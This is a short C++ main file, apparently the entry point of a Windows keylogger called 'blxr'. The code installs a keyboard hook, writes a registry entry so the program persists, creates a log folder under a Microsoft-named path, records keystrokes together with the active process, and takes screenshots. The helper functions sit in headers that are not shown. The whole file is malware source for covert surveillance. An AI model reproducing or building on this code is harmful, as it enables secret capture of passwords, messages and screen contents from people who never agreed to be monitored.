#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"

int main() {
  key_hook::InstallHook();
  sys::AddToRegistry("blxr");

  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
  stream::MakeFile();
  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);

  screen::CaptureScreen(stream::GetPath(R"(\Microsoft\blxr\)"), "screen.jpeg");

  key_hook::HandleMessage(true);

  return 0;
}